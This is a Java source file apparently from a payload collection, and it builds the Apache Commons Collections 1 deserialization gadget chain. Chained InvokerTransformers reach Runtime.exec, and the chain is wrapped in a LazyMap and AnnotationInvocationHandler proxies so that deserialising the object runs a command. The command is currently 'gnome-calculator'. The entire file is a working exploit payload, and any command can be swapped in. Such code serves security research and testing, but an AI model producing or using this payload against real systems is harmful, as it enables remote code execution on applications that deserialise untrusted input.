package nth347.payloads;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections1 {
    public CommonsCollections1() {
    }
    public static Object getPayload() throws ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(java.lang.Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[] { String.class, Class[].class },
                        new Object[] { "getRuntime", new Class[] {} }
                ),
                new InvokerTransformer("invoke",
                        new Class[] { Object.class, Object[].class },
                        new Object[] { null, new Object[] {} }
                ),
                new InvokerTransformer("exec",
                        new Class[] { String[].class },
                        new Object[] { new String[] {"gnome-calculator"} }
                ),
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map emptyMap = new HashMap();

        Map lazyMap = LazyMap.decorate(emptyMap, chainedTransformer);

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class, lazyMap);

        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] { Map.class }, handler);
        handler = (InvocationHandler) constructor.newInstance(Retention.class, proxyMap);

        return handler;
    }
}
